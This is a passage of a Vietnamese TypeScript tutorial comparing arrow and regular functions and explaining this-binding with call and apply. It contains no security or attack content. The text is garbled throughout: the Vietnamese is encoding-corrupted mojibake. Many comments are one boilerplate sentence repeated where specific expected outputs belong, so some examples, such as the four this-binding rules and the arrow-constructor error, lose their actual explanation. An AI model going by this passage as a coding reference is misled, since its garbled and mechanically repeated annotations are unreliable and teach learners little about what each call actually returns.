 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

const user = {
  name: 'Alice',
  
 // H√†m m≈©i t√™n kh√¥ng c√≥ own `this` v√† kh√¥ng th·ªÉ d√πng l√†m constructor; th√≠ch h·ª£p cho callback gi·ªØ `this` lexical.
  greetArrow: () => {
    console.log(this.name); 
 // Ch√∫ gi·∫£i: ‚ùå undefined!
 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh. H√†m m≈©i t√™n kh√¥ng c√≥ own `this` v√† kh√¥ng th·ªÉ d√πng l√†m constructor; th√≠ch h·ª£p cho callback gi·ªØ `this` lexical.
    // Kh√¥ng ph·∫£i object `user`!
  },
  
  // ‚úÖ ƒê√öNG: Regular function
  greetRegular() {
    console.log(this.name); 
 // Ch√∫ gi·∫£i: ‚úÖ "Alice"
 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
  },
  
  // ‚úÖ Use case ƒê√öNG cho arrow function
  registerEvents() {
    document.addEventListener('click', () => {
      console.log(this.name); 
 // Ch√∫ gi·∫£i: ‚úÖ "Alice"
 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh. H√†m m≈©i t√™n kh√¥ng c√≥ own `this` v√† kh√¥ng th·ªÉ d√πng l√†m constructor; th√≠ch h·ª£p cho callback gi·ªØ `this` lexical.
    });
    
    // ‚ùå Regular function s·∫Ω sai
    document.addEventListener('click', function() {
      console.log(this.name); 
 // Ch√∫ gi·∫£i: ‚ùå undefined
 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
    });
  }
};
```

**üí° Quy t·∫Øc this:**
```typescript
// Regular function: this ph·ª• thu·ªôc v√†o C√ÅI G√å g·ªçi function
obj.method() // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
fn() // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
new Fn() // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
fn.call(obj) // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.

// Arrow function: this = this c·ªßa OUTER SCOPE (n∆°i function ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a)
// Kh√¥ng quan t√¢m C√ÅI G√å g·ªçi function!
```

#### **1.3. arguments Object**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: ARGUMENTS OBJECT
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

// Regular function - C√ì arguments object
function regularWithArgs(a: number, b: number): void {
  console.log(arguments); 
 // Ch√∫ gi·∫£i: ‚úÖ Arguments { '0': 10, '1': 20, '2': 30 }
  console.log(arguments.length); // Ch√∫ gi·∫£i: 3
  console.log(arguments[2]); // Ch√∫ gi·∫£i: 30 - extra argument
}

regularWithArgs(10, 20, 30);

// Arrow function - KH√îNG c√≥ arguments
const arrowWithArgs = (a: number, b: number): void => {
 // Ch√∫ gi·∫£i: console.log(arguments);
 // Tham chi·∫øu: bi·∫øn ch·ª©a ƒë·ªãa ch·ªâ t·ªõi object trong heap; `const` kh√≥a tham chi·∫øu ch·ª© kh√¥ng kh√≥a n·ªôi dung object.
};

// ‚úÖ Gi·∫£i ph√°p: D√πng rest parameters
const arrowWithRest = (...args: number[]): void => {
  console.log(args); // Ch√∫ gi·∫£i: ‚úÖ [10, 20, 30]
  console.log(args.length); // Ch√∫ gi·∫£i: 3
};

arrowWithRest(10, 20, 30);
```

#### **1.4. Constructor & new**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
// CONSTRUCTOR - Ch·ªâ regular function c√≥ th·ªÉ l√†m constructor
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

// ‚úÖ Regular function - c√≥ th·ªÉ d√πng new
function RegularConstructor(name: string) {
  this.name = name;
}

const instance1 = new RegularConstructor('John');
console.log(instance1.name); // Ch√∫ gi·∫£i: "John" ‚úÖ

// ‚ùå Arrow function - KH√îNG th·ªÉ d√πng new
const ArrowConstructor = (name: string) => {
  this.name = name;
};

 // H√†m m≈©i t√™n kh√¥ng c√≥ own `this` v√† kh√¥ng th·ªÉ d√πng l√†m constructor; th√≠ch h·ª£p cho callback gi·ªØ `this` lexical. Constructor: h√†m/ ph∆∞∆°ng th·ª©c d√πng v·ªõi `new` ƒë·ªÉ kh·ªüi t·∫°o instance; trong `class` ph·∫£i g·ªçi `super()` tr∆∞·ªõc khi d√πng `this` n·∫øu c√≥ k·∫ø th·ª´a.
 // H√†m m≈©i t√™n kh√¥ng c√≥ own `this` v√† kh√¥ng th·ªÉ d√πng l√†m constructor; th√≠ch h·ª£p cho callback gi·ªØ `this` lexical. Constructor: h√†m/ ph∆∞∆°ng th·ª©c d√πng v·ªõi `new` ƒë·ªÉ kh·ªüi t·∫°o instance; trong `class` ph·∫£i g·ªçi `super()` tr∆∞·ªõc khi d√πng `this` n·∫øu c√≥ k·∫ø th·ª´a.
```

#### **1.5. Hoisting**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // ƒê∆∞·ª£c n√¢ng l√™n (hoisting): khai b√°o ƒë∆∞·ª£c chuy·ªÉn l√™n ƒë·∫ßu ph·∫°m vi; `var` kh·ªüi t·∫°o v·ªõi `undefined`, c√≤n `let/const` n·∫±m trong v√πng ch·∫øt t·∫°m th·ªùi (TDZ).
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

// ‚úÖ Regular function - HOISTED (c√≥ th·ªÉ g·ªçi tr∆∞·ªõc khi khai b√°o)
console.log(regularHoisted()); // Ch√∫ gi·∫£i: ‚úÖ "Hello" - works!

function regularHoisted(): string {
  return 'Hello';
}

// ‚ùå Arrow function - KH√îNG hoisted
 // ƒê∆∞·ª£c n√¢ng l√™n (hoisting): khai b√°o ƒë∆∞·ª£c chuy·ªÉn l√™n ƒë·∫ßu ph·∫°m vi; `var` kh·ªüi t·∫°o v·ªõi `undefined`, c√≤n `let/const` n·∫±m trong v√πng ch·∫øt t·∫°m th·ªùi (TDZ). H√†m m≈©i t√™n kh√¥ng c√≥ own `this` v√† kh√¥ng th·ªÉ d√πng l√†m constructor; th√≠ch h·ª£p cho callback gi·ªØ `this` lexical.
 // ƒê∆∞·ª£c n√¢ng l√™n (hoisting): khai b√°o ƒë∆∞·ª£c chuy·ªÉn l√™n ƒë·∫ßu ph·∫°m vi; `var` kh·ªüi t·∫°o v·ªõi `undefined`, c√≤n `let/const` n·∫±m trong v√πng ch·∫øt t·∫°m th·ªùi (TDZ). Tham chi·∫øu: bi·∫øn ch·ª©a ƒë·ªãa ch·ªâ t·ªõi object trong heap; `const` kh√≥a tham chi·∫øu ch·ª© kh√¥ng kh√≥a n·ªôi dung object. H√†m m≈©i t√™n kh√¥ng c√≥ own `this` v√† kh√¥ng th·ªÉ d√πng l√†m constructor; th√≠ch h·ª£p cho callback gi·ªØ `this` lexical.

const arrowHoisted = (): string => 'Hello';
```

#### **1.6. Methods & Prototype**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
// PROTOTYPE - Regular c√≥ prototype, Arrow kh√¥ng
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function RegularFn() {}
console.log(RegularFn.prototype); // Constructor: h√†m/ ph∆∞∆°ng th·ª©c d√πng v·ªõi `new` ƒë·ªÉ kh·ªüi t·∫°o instance; trong `class` ph·∫£i g·ªçi `super()` tr∆∞·ªõc khi d√πng `this` n·∫øu c√≥ k·∫ø th·ª´a.

const ArrowFn = () => {};
console.log(ArrowFn.prototype); // Ch√∫ gi·∫£i: ‚ùå undefined

// Use case: Th√™m methods v√†o prototype
function Person(name: string) {
  this.name = name;
}

Person.prototype.greet = function() {
  return `Hello, I'm ${this.name}`;
  // ‚úÖ Ph·∫£i d√πng regular function ƒë·ªÉ c√≥ this
};

const person = new Person('John');
console.log(person.greet()); // Ch√∫ gi·∫£i: "Hello, I'm John"
```

---

### **2. this Binding - call, apply, bind**

#### **2.1. Understanding `this` Context**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
// THIS CONTEXT - 4 quy t·∫Øc
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

 // Ch√∫ gi·∫£i: 1Ô∏è‚É£ Default binding (strict mode: undefined, non-strict: window)
function showThis() {
  console.log(this);
}
showThis(); // window (non-strict) ho·∫∑c undefined (strict)

 // Ch√∫ gi·∫£i: 2Ô∏è‚É£ Implicit binding (object g·ªçi method)
const obj = {
  name: 'John',
  greet() {
    console.log(this.name); // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
  }
};
obj.greet();

 // D√πng `bind`, `call`, ho·∫∑c `apply` ƒë·ªÉ thi·∫øt l·∫≠p `this` r√µ r√†ng khi c·∫ßn.
function greet() {
  console.log(this.name);
}
const user = { name: 'Alice' };
greet.call(user); // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.

 // Constructor: h√†m/ ph∆∞∆°ng th·ª©c d√πng v·ªõi `new` ƒë·ªÉ kh·ªüi t·∫°o instance; trong `class` ph·∫£i g·ªçi `super()` tr∆∞·ªõc khi d√πng `this` n·∫øu c√≥ k·∫ø th·ª´a.
function Person(name: string) {
  this.name = name;
}
const p = new Person('Bob'); // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
```

#### **2.2. call() - G·ªçi ngay v·ªõi arguments ri√™ng l·∫ª**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh. D√πng `bind`, `call`, ho·∫∑c `apply` ƒë·ªÉ thi·∫øt l·∫≠p `this` r√µ r√†ng khi c·∫ßn.
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function introduce(age: number, city: string): string {
  return `I'm ${this.name}, ${age} years old, from ${city}`;
}

const person1 = { name: 'John' };
const person2 = { name: 'Alice' };

 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
console.log(introduce.call(person1, 25, 'HCM')); 
 // Ch√∫ gi·∫£i: "I'm John, 25 years old, from HCM"

 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.
console.log(introduce.call(person2, 30, 'HN')); 
 // Ch√∫ gi·∫£i: "I'm Alice, 30 years old, from HN"

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: Use case: Function borrowing
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

const car = {
  brand: 'Toyota',
  model: 'Camry',
  getInfo() {
    return `${this.brand} ${this.model}`;
  }
};

const bike = { brand: 'Honda', model: 'CBR' };

 // Ch√∫ gi·∫£i: "M∆∞·ª£n" method getInfo c·ªßa car cho bike
console.log(car.getInfo.call(bike)); 
 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh.

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: Use case: Array-like to Array
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function argsToArray() {
  // arguments l√† array-like, kh√¥ng ph·∫£i array
 // Ch√∫ gi·∫£i: M∆∞·ª£n method slice c·ªßa Array
  const arr = Array.prototype.slice.call(arguments);
  console.log(arr); // [1, 2, 3] - th√†nh array th·∫≠t ‚úÖ
}

argsToArray(1, 2, 3);
```

#### **2.3. apply() - G·ªçi ngay v·ªõi array of arguments**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // `this` ph·ª• thu·ªôc c√°ch g·ªçi; h√†m m≈©i t√™n d√πng lexical `this` (k·∫ø th·ª´a t·ª´ scope cha), c√°c h√†m th∆∞·ªùng c√≥ `this` thay ƒë·ªïi theo ng·ªØ c·∫£nh. D√πng `bind`, `call`, ho·∫∑c `apply` ƒë·ªÉ thi·∫øt l·∫≠p `this` r√µ r√†ng khi c·∫ßn.
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function introduce(age: number, city: string): string {
  return `I'm ${this.name}, ${age} years old, from ${city}`;
}

const person = { name: 'John' };

// apply - arguments l√† ARRAY
const args = [25, 'HCM'];
console.log(introduce.apply(person, args)); 
 // Ch√∫ gi·∫£i: "I'm John, 25 years old, from HCM"

// So s√°nh v·ªõi call
console.log(introduce.call(person, 25, 'HCM')); // Gi·ªëng k·∫øt qu·∫£

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: Use case: Math.max v·ªõi array
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

const numbers = [5, 6, 2, 3, 7, 1];

// ‚ùå Math.max nh·∫≠n arguments ri√™ng l·∫ª, kh√¥ng nh·∫≠n array
 // Ch√∫ gi·∫£i: console.log(Math.max(numbers)); // NaN

// ‚úÖ D√πng apply ƒë·ªÉ "spread" array th√†nh arguments
console.log(Math.max.apply(null, numbers)); // Ch√∫ gi·∫£i: 7

// Modern: D√πng spread operator (ES6+)
console.log(Math.max(...numbers)); // 7 - d·ªÖ ƒë·ªçc h∆°n ‚úÖ

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
// call vs apply - Khi n√†o d√πng c√°i n√†o?
